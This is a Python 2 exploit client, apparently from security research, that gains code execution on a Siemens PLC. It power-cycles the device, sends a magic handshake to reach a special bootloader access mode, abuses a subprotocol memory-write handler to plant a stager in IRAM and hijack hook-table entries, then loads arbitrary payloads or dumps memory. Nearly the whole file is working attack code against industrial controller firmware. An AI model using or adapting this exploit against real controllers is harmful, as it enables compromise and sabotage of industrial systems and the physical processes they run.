#!/usr/bin/env python2
# Would you please hold my beer while I am cleaning this code?
# ./client.py --switch-power --powersupply-host=localhost --powersupply-port=9001 --powersupply-delay=10 run -p payloads/hello_world/hello_world.bin

import struct
import time
import socket
import select
import sys
# import subprocess # No longer needed for power supply
#import crc32be
import os
import argparse
import logging

# Import power supply control functions
from tools.powersupply.switch_power import power_control_allnet, power_control_modbus

from binascii import hexlify

from pwn import remote, context, log, xor
context.update(log_level="info", bits=32, endian="big")

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Runtime configs
SEND_REQ_SAFETY_SLEEP_AMT = 0.01

STAGER_PL_FILENAME = "payloads/stager/stager.bin"
DUMPMEM_PL_FILENAME = "payloads/dump_mem/build/dump_mem.bin"
FIRST_PAYLOAD_LOCATION = 0x10010100
MAX_MSG_LEN = 192-2
DEFAULT_STAGER_ADDHOOK_IND = 0x20
DEFAULT_SECOND_ADD_HOOK_IND = 0x1a
IRAM_STAGER_START = 0x10030100
IRAM_STAGER_END = 0x100303FC
IRAM_STAGER_MAX_SIZE = IRAM_STAGER_END - IRAM_STAGER_START
BOOTLOADER_EMPTY_MEM = 0x20000

ANSW_INVALID_CHECKSUM = "\xff\x80\x03"
ANSW_ENTER_SUBPROTO_SUCCESS = "\x80\x00"

UART_WRITE_BUF = 0x100367EC
UART_READ_BUF = 0x100366EC
ADD_HOOK_TABLE_START = 0x1003ABA0

SUBPROT_80_MODE_IRAM = 1
SUBPROT_80_IOC_SPI = 2
SUBPROT_80_MODE_FLASH = 3
SUBPROT_80_MODE_NOP = 4

SUBPROT_80_MODE_MAGICS = [None, 0x3BC2, 0x9d26, 0xe17a, 0xc54f]

ACTION_INVOKE_HOOK = "invoke"
ACTION_DUMP = 'dump'
ACTION_TEST = "test"
ACTION_TIC_TAC_TOE = "tictactoe"
ACTION_HELLO_LOOP = "hello_loop"
ACTION_POWER_ON_ONLY = "power-on-only"
ACTION_POWER_OFF_ONLY = "power-off-only"


class PayloadManager(object):
    def __init__(self, first_payload_location):
        self.next_payload_location = first_payload_location

    def update_next_payload_location(self, tar_addr, shellcode_len):
        if tar_addr == self.next_payload_location:
            self.next_payload_location += shellcode_len
            while self.next_payload_location % 4 != 0:
                self.next_payload_location += 1

def print_answ(r, answ):
    logger.info("Got answer: {} [{}]".format(answ, hexlify(answ)))

def calc_checksum_byte(incoming):
    # Format: <len_byte><byte_00>..<byte_xx><checksum_byte>
    # Checksum: LSB of negative sum of byte values
    return struct.pack("<i", -sum(map(ord, incoming[:ord(incoming[0])])))[0]

def send_packet(r, msg, step=2, sleep_amt=0.01):
    if len(msg) > MAX_MSG_LEN:
        raise ValueError("Message length {} exceeds MAX_MSG_LEN {}".format(len(msg), MAX_MSG_LEN))
    time.sleep(SEND_REQ_SAFETY_SLEEP_AMT)
    msg = chr(len(msg)+1)+msg
    msg = msg + calc_checksum_byte(msg)
    log.info("sending packet: {}".format(msg.encode("hex")))
    for i in range(0, len(msg), step):
        time.sleep(sleep_amt)
        r.send(msg[i:i+step])

def recv_packet(r):
    answ = r.recv(1)
    rem = ord(answ)
    while rem != 0:
        add = r.recv(rem)
        rem -= len(add)
        answ += add

    if calc_checksum_byte(answ[:-1]) != answ[-1]:
        logger.error("Checksum validity failed. Got: {} [{}]".format(answ, answ.encode("hex")))
        return None
    else:
        return answ[1:-1]

def format_size(size_bytes):
    """Converts a size in bytes to a human-readable string (B, KB, MB, GB)."""
    if size_bytes < 1024:
        return "{:.1f} B".format(size_bytes)
    size_kb = size_bytes / 1024.0
    if size_kb < 1024:
        return "{:.1f} KB".format(size_kb)
    size_mb = size_kb / 1024.0
    if size_mb < 1024:
        return "{:.1f} MB".format(size_mb)
    size_gb = size_mb / 1024.0
    return "{:.1f} GB".format(size_gb)

def recv_many(r, verbose=False, total_bytes=None, baudrate=115200):
    import sys
    answ = ""
    stop = False
    start_time = time.time()
    last_print = 0
    while not stop:
        next_chunk = recv_packet(r)
        if next_chunk == "":
            stop = True
        else:
            answ += next_chunk
        if total_bytes:
            now = time.time()
            if now - last_print > 0.2 or stop:
                last_print = now
                done = len(answ)
                percent = float(done) / total_bytes
                elapsed = now - start_time
                speed = done / elapsed if elapsed > 0 else 0
                est_total = total_bytes / speed if speed > 0 else 0
                est_left = est_total - elapsed if est_total > elapsed else 0
                bar_len = 30
                filled = int(bar_len * percent)
                bar = '[' + '=' * filled + ' ' * (bar_len - filled) + ']'
                # Use format_size for done and total_bytes
                sys.stdout.write("\r{} {:6.1f}% {}/{} | Elapsed: {:5.1f}s | ETA: {:5.1f}s".format(
                    bar, percent*100, format_size(done), format_size(total_bytes), elapsed, est_left))
                sys.stdout.flush()
    if total_bytes:
        sys.stdout.write("\n") # Ensure newline after progress bar completion
    return answ

def encode_packet_for_stager(chunk):
    for i in range(1, 256):
        if chr(i) not in chunk and i != len(chunk)+2:
            log.info("Sending chunk with xor key: 0x{:02x}".format(i))
            encoded = chr(i) + "".join(map(lambda x: chr(ord(x) ^ i), chunk))
            return encoded
    logger.error("Could not encode chunk: {}".format(chunk.encode("hex")))
    raise ValueError("Could not encode chunk")

def send_full_msg_via_stager(r, msg, chunk_size=2, sleep_amt=0.01):
    for i in range(0, len(msg), MAX_MSG_LEN-1):
        time.sleep(SEND_REQ_SAFETY_SLEEP_AMT)
        chunk = msg[i:i + MAX_MSG_LEN - 1]
        log.info("Send progress: 0x{:06x}/0x{:06x} ({:3.2f})".format(i, len(msg), float(i)/float(len(msg))))
        send_packet(r, encode_packet_for_stager(chunk), chunk_size, sleep_amt)
        answ = recv_packet(r)
        if not len(answ) == 1:
            logger.warning("expecting empty ack package (answ of size 1), got '{}' instead".format(answ))
            raise ValueError("Invalid ack package")
        if answ == "\xff":
            logger.warning("[WARNING] Interrupting the sending...")
            return None
    send_packet(r, encode_packet_for_stager(""))
    answ = recv_packet(r)

def invoke_primary_handler(r, handler_ind, args="", await_response=True):
    payload = chr(handler_ind)
    send_packet(r, payload+args)
    if await_response:
        return recv_packet(r)
    else:
        return None

def enter_subproto_handler(r, mode, args=""):
    assert(1 <= mode <= len(SUBPROT_80_MODE_MAGICS))
    return invoke_primary_handler(r, 0x80, struct.pack(">H", SUBPROT_80_MODE_MAGICS[mode]))

def leave_subproto_handler(r):
    send_packet(r, chr(0x81)+"\xD0\x67")
    return recv_packet(r)

def subproto_read(r):
    send_packet(r, chr(0x83))
    return recv_packet(r)

def _raw_subproto_write(r, arg_dw, add_args, really=False, step=2, sleep_amt=0.01):
    if not really:
        raise RuntimeError("Dangerous write attempted without confirmation")
    send_packet(r, chr(0x84)+"\x5a\x2e"+struct.pack(">I", arg_dw)+add_args, step, sleep_amt)
    return recv_packet(r)

def _exploit_write_chunk_to_iram(r, tar, contents, already_in_80_handler=False):
    assert(len(contents) % 2 == 0)
    assert(len(contents)+8 <= MAX_MSG_LEN)
    assert(0x10000000 <= tar)
    assert(tar + len(contents) <= 0x10800000)
    if not already_in_80_handler:
        answ = enter_subproto_handler(r, SUBPROT_80_MODE_IRAM)
    target_argument = tar-0x10000000
    answ = _raw_subproto_write(r, target_argument, len(contents)*"\xff", True)
    if len(contents) == 4 and (contents[:2] in ["\x00\x00", "\x0a\x00"] or contents[2:4] in ["\x00\x00", "\x0a\x00"]):
        answ = _raw_subproto_write(r, target_argument, contents[:2], True)
        answ = _raw_subproto_write(r, target_argument+2, contents[2:4], True)
    else:
        answ = _raw_subproto_write(r, target_argument, contents, True)
    if not already_in_80_handler:
        leave_subproto_handler(r)
    return answ

def exploit_write_to_iram(r, tar, contents):
    assert(len(contents) % 2 == 0)
    assert(0x10000000 <= tar and tar + len(contents) <= 0x10800000)
    answ = enter_subproto_handler(r, SUBPROT_80_MODE_IRAM)
    assert(answ == ANSW_ENTER_SUBPROTO_SUCCESS)
    if len(contents) % 4 == 2:
        _exploit_write_chunk_to_iram(r, tar, contents[:2], True)
        tar += 2
        contents = contents[2:]
    chunk_size = 16
    for i in range(0, len(contents), chunk_size):
        logger.info("Writing {:04x}/{:04x}".format(i, len(contents)))
        chunk = contents[i:i+chunk_size]
        answ = _exploit_write_chunk_to_iram(r, tar+i, chunk, True)
    leave_subproto_handler(r)
    return answ

def get_version(r):
    hook_ind = 0
    send_packet(r, chr(hook_ind))
    answ = recv_packet(r)
    return answ

def bye(r):
    hook_ind = 0xa2
    send_packet(r, chr(hook_ind))
    answ = recv_packet(r)
    if answ == "\xa2\x00":
        logger.info("[+] PLC responded to bye() as expected ({}).".format(repr(answ)))
    elif answ and ord(answ[0]) in range(0x00, 0x80):
        logger.warning("[!] PLC responded to bye() with handler index: 0x{:02x} ({}), likely last handler used.".format(ord(answ[0]), repr(answ)))
    else:
        logger.warning("[!] Warning: Unexpected response to bye(): {}".format(repr(answ)))

def invoke_add_hook(r, add_hook_no, args="", await_response=True):
    assert(0 <= add_hook_no <= 0x20)
    hook_ind = 0x1c
    args = chr(add_hook_no)+args
    return invoke_primary_handler(r, hook_ind, args, await_response)

def _exploit_install_add_hook(r, tar_addr, shellcode, add_hook_no):
    assert(0 <= add_hook_no <= 0x20)
    if len(shellcode) % 2 != 0:
        shellcode += "\xff"
    exploit_write_to_iram(r, tar_addr, shellcode)
    exploit_write_to_iram(r, ADD_HOOK_TABLE_START+8*add_hook_no+2, "\x00\xff"+struct.pack(">I", tar_addr))

def install_stager(r, shellcode, tar_addr=IRAM_STAGER_START, add_hook_no=DEFAULT_STAGER_ADDHOOK_IND):
    assert(0 < len(shellcode) <= IRAM_STAGER_MAX_SIZE)
    _exploit_install_add_hook(r, tar_addr, shellcode, add_hook_no)
    return add_hook_no

def write_via_stager(r, tar_addr, contents, stager_add_hook_ind=DEFAULT_STAGER_ADDHOOK_IND):
    invoke_add_hook(r, stager_add_hook_ind, struct.pack(">I", tar_addr), False)
    send_full_msg_via_stager(r, contents, 8, 0.01)

def install_addhook_via_stager(r, tar_addr, shellcode, stager_addhook_ind=DEFAULT_STAGER_ADDHOOK_IND, add_hook_no=DEFAULT_SECOND_ADD_HOOK_IND, payload_manager=None):
    write_via_stager(r, ADD_HOOK_TABLE_START+8*add_hook_no, "\x00\x00\x00\xff"+struct.pack(">I", tar_addr), stager_addhook_ind)
    write_via_stager(r, tar_addr, shellcode, stager_addhook_ind)
    if payload_manager:
        payload_manager.update_next_payload_location(tar_addr, len(shellcode))
    return add_hook_no

def payload_dump_mem(r, tar_addr, num_bytes, addhook_ind, baudrate=115200):
    answ = invoke_add_hook(r, addhook_ind, "A"+struct.pack(">II", tar_addr, num_bytes))
    log.debug("[payload_dump_mem] answ (len: {}): {}".format(len(answ), answ))
    assert(answ.startswith("Ok"))
    contents = recv_many(r, verbose=False, total_bytes=num_bytes, baudrate=baudrate)
    return contents

def handle_conn(r, action, args, payload_manager):
    logger.info("[+] Got connection")
    answ = recv_packet(r)
    logger.info('\x1b[6;30;42m[+] Got special access greeting: {} [{}]\x1b[0m'.format(answ, hexlify(answ)))

    for i in range(1):
        version = get_version(r)
        bootloaderversion = version[2:3]+".".join([str(ord(c)) for c in version[3:-2]])
        logger.info('\x1b[6;30;42m[+] Got PLC bootLoader version: ' + bootloaderversion + '\x1b[0m')

    # Always install the stager payload
    start = time.time()
    stager_payload = args.stager.read() if hasattr(args, "stager") and args.stager else None
    stager_addhook_ind = install_stager(r, stager_payload)
    logger.info("Writing the initial stage took {} seconds".format(time.time()-start))

    # Unified payload reading
    payload = args.payload.read() if hasattr(args, "payload") and args.payload else None

    if action not in [ACTION_INVOKE_HOOK, ACTION_DUMP, ACTION_TEST, ACTION_TIC_TAC_TOE, ACTION_HELLO_LOOP]:
        logger.error("Unknown action")
        exit(-1)

    second_addhook_ind = None
    if payload is not None:
        start = time.time()
        second_addhook_ind = install_addhook_via_stager(
            r, payload_manager.next_payload_location, payload, stager_addhook_ind, DEFAULT_SECOND_ADD_HOOK_IND, payload_manager)
        logger.info("Installing the additional hook took {} seconds".format(time.time()-start))

    if action == ACTION_INVOKE_HOOK:
        answ = invoke_add_hook(r, second_addhook_ind, args.args)
        logger.info("Got answer: {}".format(answ))

    elif action == ACTION_DUMP:
        out_filename = args.outfile if hasattr(args, "outfile") and args.outfile else "mem_dump_{:08x}_{:08x}".format(args.address, args.address + args.length)
        logger.info("dumping a total of {} bytes of memory at 0x{:08x}".format(args.length, args.address))
        contents = payload_dump_mem(r, args.address, args.length, second_addhook_ind, baudrate=38400)
        with open(out_filename, "wb") as f:
            f.write(contents)
        logger.info("Wrote data out to {}".format(out_filename))

    elif action == ACTION_TEST:
        answ = invoke_add_hook(r, second_addhook_ind)
        logger.info("Got answer: {}".format(answ))

    elif action == ACTION_HELLO_LOOP:
        answ = invoke_add_hook(r, second_addhook_ind, await_response=False)
        while True:
            logger.info("Got packet: {}".format(recv_packet(r)))

    elif action == ACTION_TIC_TAC_TOE:
        logger.info("[*] Demonstrating Code Execution")
        invoke_add_hook(r, second_addhook_ind, await_response=False)
        msg = ""
        END_TOKEN = "==>"
        while END_TOKEN not in msg:
            msg = recv_packet(r)
            sys.stdout.write(msg)
            sys.stdout.flush()
            if "enter a number" in msg:
                choice = raw_input()
                send_packet(r, choice[0])
        logger.info("[*] Done here!")

    logger.info("Saying bye...")
    if getattr(args, "cont", False):
        bye(r)
    else:
        raw_input("Press to continue loading firmware...")
        bye(r)

magic = "MFGT1"
pad = 4*"A"

def _handle_power_action(args, mode_on):
    """Helper function to turn power on or off."""
    action_str = "on" if mode_on else "off"
    logger.info("Turning power supply {}...".format(action_str))
    success = False
    if args.powersupply_method == 'modbus':
        if not args.modbus_ip or args.modbus_output is None: # Ensure modbus_output is int after parsing
            logger.error("Modbus IP and output coil must be specified for modbus power control.")
            sys.exit(1)
        success = power_control_modbus(args.modbus_ip, args.modbus_port, int(args.modbus_output), mode_on)
    elif args.powersupply_method == 'allnet':
        success = power_control_allnet(args.powersupply_host, args.powersupply_port, mode_on)
    else:
        logger.error("Unknown power supply method: {}".format(args.powersupply_method))
        sys.exit(1)

    if success:
        logger.info("Successfully turned power supply {}.".format(action_str))
    else:
        logger.error("Failed to turn power supply {}.".format(action_str))
        sys.exit(1)
    return success


def main():
    parser = argparse.ArgumentParser(description='Trigger code execution on Siemens PLC')

    # Power supply arguments (now a separate group for clarity)
    power_group = parser.add_argument_group('Power Supply Control')
    power_group.add_argument('--powersupply-method', dest='powersupply_method', default='modbus', choices=['allnet', 'modbus'],
                        help='Power supply control method: modbus (default) or allnet.')
    power_group.add_argument('--powersupply-delay', dest='powersupply_delay', default=1000, type=lambda x: int(x, 0), # Default changed to 1s for quicker testing
                        help="Number of milliseconds to wait after turning OFF power supply before turning it ON. Defaults to 1000 (1s).")

    allnet_group = power_group.add_argument_group('ALLNET Specific Arguments')
    allnet_group.add_argument('--powersupply-host', dest='powersupply_host', default='powersupply',
                        help='Host of ALLNET powersupply, defaults to "powersupply".')
    allnet_group.add_argument('--powersupply-port', dest='powersupply_port', default=80, type=lambda x: int(x, 0),
                        help="Port of ALLNET powersupply. Defaults to 80.")

    modbus_group = power_group.add_argument_group('Modbus TCP Specific Arguments')
    modbus_group.add_argument('--modbus-ip', dest='modbus_ip', default='192.168.1.18', help='Modbus TCP IP address (default: 192.168.1.18).')
    modbus_group.add_argument('--modbus-port', dest='modbus_port', default=502, type=lambda x: int(x, 0), help='Modbus TCP port (default: 502).')
    modbus_group.add_argument('--modbus-output', dest='modbus_output', default=None, type=int, help='Modbus output/coil (integer) to control. Required for modbus.')


    # Main operations group
    common_group = parser.add_argument_group('Common PLC Interaction Arguments')
    common_group.add_argument('-P', '--port', dest='port', type=lambda x: int(x, 0),
                        help="Local port that socat is listening to, forwarding to serial device (may also be a port forwarded via SSH). Required if not a power-only action.")
    common_group.add_argument('--switch-power', dest='switch_power', default=False, action='store_true',
                        help='Cycle power (off, delay, on) before performing the specified action. Handshake starts immediately after power on.')
    common_group.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('r'), default=STAGER_PL_FILENAME,
                        help='The location of the stager payload.')
    common_group.add_argument('-c', '--continue', dest='cont', default=False, action='store_true', help="Continue PLC execution after action completed.")
    common_group.add_argument('-e', '--extra', default="", dest='extra', nargs='+', help="Additional arguments for custom logic.")


    # Subparsers for different actions
    subparsers = parser.add_subparsers(dest="action", help="Action to perform. If a power-only action is chosen, other PLC interaction arguments are ignored.")

    # Power-only actions
    parser_power_on = subparsers.add_parser(ACTION_POWER_ON_ONLY, help="Turn the power supply ON only.")
    parser_power_off = subparsers.add_parser(ACTION_POWER_OFF_ONLY, help="Turn the power supply OFF only.")

    # PLC interaction actions
    parser_invoke_hook = subparsers.add_parser(ACTION_INVOKE_HOOK, help="Invoke a hook with a payload.")
    parser_invoke_hook.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('rb'), default=None,
                        help='The file containing the payload to be executed.', required=True)
    parser_invoke_hook.add_argument('-a', '--args', default="", dest='args', nargs='+', help="Additional arguments to be passed to payload invocation.")

    parser_dump = subparsers.add_parser(ACTION_DUMP, help="Dump memory from the PLC.")
    parser_dump.add_argument('-a', '--address', dest="address", type=lambda x: int(x, 0), help="Address to dump at.", required=True)
    parser_dump.add_argument('-l', '--length', dest="length", type=lambda x: int(x, 0), help="Number of bytes to dump.", required=True)
    parser_dump.add_argument('-d', '--dump-payload', dest='payload', type=argparse.FileType('rb'), default=DUMPMEM_PL_FILENAME)
    parser_dump.add_argument('-o', '--out-file', dest='outfile', default=None, help="Name of file to store the dump at.")

    parser_test = subparsers.add_parser(ACTION_TEST, help="Run a test payload.")
    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('r'), default="payloads/hello_world/hello_world.bin",
                        help='The file containing the payload to be executed, defaults to payloads/hello_world/hello_world.bin.')

    parser_hello_loop = subparsers.add_parser(ACTION_HELLO_LOOP, help="Run the hello_loop payload.") # Corrected parser name
    parser_hello_loop.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('r'), default="payloads/hello_loop/build/hello_loop.bin",
                        help='The file containing the payload to be executed, defaults to payloads/hello_loop/build/hello_loop.bin.')

    parser_tic_tac_toe = subparsers.add_parser(ACTION_TIC_TAC_TOE, help="Run the tic_tac_toe payload.") # Corrected parser name
    parser_tic_tac_toe.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('r'), default="payloads/tic_tac_toe/build/tic_tac_toe.bin",
                        help='The file containing the payload to be executed, defaults to payloads/tic_tac_toe/build/tic_tac_toe.bin.')

    args = parser.parse_args()

    # Handle power-only actions first
    if args.action == ACTION_POWER_ON_ONLY:
        _handle_power_action(args, mode_on=True)
        sys.exit(0)
    elif args.action == ACTION_POWER_OFF_ONLY:
        _handle_power_action(args, mode_on=False)
        sys.exit(0)

    # For other actions, the PLC port is required
    if args.port is None:
        parser.error("Argument -P/--port is required for action '{}'.".format(args.action))

    # Validate modbus output if method is modbus and it's not a power-only action already handled
    if (args.switch_power or args.powersupply_method == 'modbus') and args.modbus_output is None and args.powersupply_method == 'modbus':
         # This check is a bit broad, refine if only specific actions need it with modbus
        if args.action not in [ACTION_POWER_ON_ONLY, ACTION_POWER_OFF_ONLY]: # Already handled
            logger.warning("Warning: --modbus-output is not set. This might be required for power control with modbus method.")
            # If switch_power is true, it will fail later in _handle_power_action if modbus_output is truly needed.
            # If only powersupply_method is 'modbus' but switch_power is false, this is just a warning.

    payload_manager = PayloadManager(FIRST_PAYLOAD_LOCATION)
    s = None # Initialize s to None

    if args.switch_power:
        logger.info("Power cycling sequence started...")
        # 1. Turn Power OFF
        if not _handle_power_action(args, mode_on=False):
            logger.error("Failed to turn power OFF. Aborting.")
            sys.exit(1)

        # 2. Wait for the specified delay
        delay_sec = args.powersupply_delay / 1000.0
        logger.info("Waiting for {:.2f} seconds before turning power ON.".format(delay_sec))
        time.sleep(delay_sec)

        # 3. Turn Power ON
        if not _handle_power_action(args, mode_on=True):
            logger.error("Failed to turn power ON. Aborting.")
            sys.exit(1)

        logger.info("Power ON successful. Attempting to connect and handshake immediately...")
        # Connection and handshake attempts should start immediately after power on
        # The original code had a loop that also checked power_on_time, which is now simplified.

        # Attempt to connect to PLC
        try:
            s = remote("localhost", args.port)
        except Exception as e:
            logger.error("[!] Failed to connect to remote host on port {} after power cycle: {}".format(args.port, e))
            sys.exit(1)

        handshake_received = False
        handshake_attempts = 0
        max_handshake_attempts = 50 # Try for 5 seconds (50 * 0.1s timeout)

        while not handshake_received and handshake_attempts < max_handshake_attempts:
            s.send(pad + magic)
            try:
                answ = s.recv(256, timeout=0.1) # Short timeout for quick retries
            except Exception: # Catches socket.timeout and other pwn.socket.timeout etc.
                answ = ''

            if answ and answ.startswith("\5-CPU"):
                # Sometimes the full greeting isn't received in one go
                # This part might need adjustment based on observed behavior
                # For now, assume if it starts with \5-CPU, it's likely the greeting
                # The original code had s.recv(256) again, which could block if no more data.
                # Keeping it simple: if it starts with the magic bytes, assume success.
                if not answ.endswith("\r\n"): # Simple check, might need refinement
                    try:
                        answ += s.recv(256, timeout=0.1) # Try to get more if needed
                    except Exception:
                        pass # Ignore if no more data immediately

                # Ensure the full expected prefix, though the original only checked startswith
                # For robustness, one might check the full expected greeting format if known.
                # For now, stick to the original logic's spirit:
                if answ.startswith("\5-CPU"): # Re-check in case recv changed it
                    s.unrecv(answ) # Put the full received answer back for handle_conn
                    handshake_received = True
                    logger.info("[+] Special access greeting received after power cycle!")
                    handle_conn(s, args.action, args, payload_manager)
                    sys.exit(0) # Successfully handled connection

            handshake_attempts += 1
            if not handshake_received:
                logger.info("Handshake attempt {} failed. Retrying...".format(handshake_attempts))
                # No explicit sleep here as recv timeout provides a delay

        if not handshake_received:
            logger.error("[!] Handshake timeout: did not receive special access greeting after {} attempts.".format(max_handshake_attempts))
            if s:
                s.close()
            sys.exit(1)
        return # Should have exited via sys.exit(0) or sys.exit(1) above

    # If not switching power, connect directly (if an action other than power-only is given)
    if args.action and args.action not in [ACTION_POWER_ON_ONLY, ACTION_POWER_OFF_ONLY]:
        try:
            s = remote("localhost", args.port)
        except Exception as e:
            logger.error("[!] Failed to connect to remote host on port {}: {}".format(args.port, e))
            sys.exit(1)
        handle_conn(s, args.action, args, payload_manager)

if __name__ == "__main__":
    main()